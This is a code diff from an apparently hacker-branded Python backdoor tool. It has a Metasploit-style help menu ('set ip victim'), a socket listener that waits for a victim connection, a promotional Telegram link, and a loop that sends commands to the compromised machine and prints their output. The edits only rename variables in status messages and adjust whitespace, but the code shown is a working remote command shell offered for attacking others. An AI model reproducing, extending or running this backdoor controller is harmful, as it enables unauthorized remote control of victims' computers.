@@ -48,7 +48,7 @@ while session:
 | set lport               set port system attack
 |
 | set rhost               set ip victim
-| set rport               set port victim
+| set rport               set port victim 
 |
 | options                 show options
 ============================================
@@ -175,21 +175,16 @@ FILEPATH : {filename}.py
 
 
 		print("")
-		print(f'[+] Starting Reverse Handler On {IP}:{PORT}')
+		print(f'[+] Starting Reverse Handler On {rhost}:{rport}')
 		time.sleep(2)
-  
 		print('[*] Startingthe payload backdoor...')
 		time.sleep(1)
-  
-		print('[*] Server is listening on '+ str(IP) + ":" + str(PORT) + '...')
+		print('[*] Server is listening on '+ str(rhost) + ":" + str(rport) + '...')
 		conn, addr = s.accept()
-  
 		print('[+] Connected Done From ', addr)
 		time.sleep(2)
-  
 		print("[+] Join Us : https://t.me/Anon0psNews/")
 		time.sleep(1)
-  
 		print("[+] session started...")
 
 		session_door = True
@@ -209,3 +204,4 @@ FILEPATH : {filename}.py
 		          conn.send(command.encode())
 		          output = conn.recv(1024)
 		          print("\n", output, "\n")
+	    
